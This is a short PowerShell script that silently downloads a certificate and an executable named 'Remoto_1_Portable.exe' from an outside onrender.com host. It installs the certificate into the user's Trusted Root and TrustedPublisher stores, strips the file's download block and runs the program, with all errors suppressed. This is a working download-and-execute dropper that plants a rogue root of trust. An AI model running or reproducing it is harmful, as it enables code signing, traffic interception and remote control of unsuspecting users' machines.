$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = 'SilentlyContinue'

$urlBase = 'https://remoto-1.onrender.com'
$escritorio = [Environment]::GetFolderPath('Desktop')
$rutaExe = Join-Path $escritorio 'Remoto_1_Portable.exe'
$rutaCer = Join-Path $env:TEMP 'Remoto_1_Certificado.cer'

Invoke-WebRequest -Uri "$urlBase/Remoto_1_Certificado.cer" -OutFile $rutaCer
if (Test-Path $rutaCer) {
    Import-Certificate -FilePath $rutaCer -CertStoreLocation Cert:\CurrentUser\Root | Out-Null
    Import-Certificate -FilePath $rutaCer -CertStoreLocation Cert:\CurrentUser\TrustedPublisher | Out-Null
}

Invoke-WebRequest -Uri "$urlBase/Remoto_1_Portable.exe" -OutFile $rutaExe
Unblock-File -Path $rutaExe -ErrorAction SilentlyContinue

Start-Process -FilePath $rutaExe
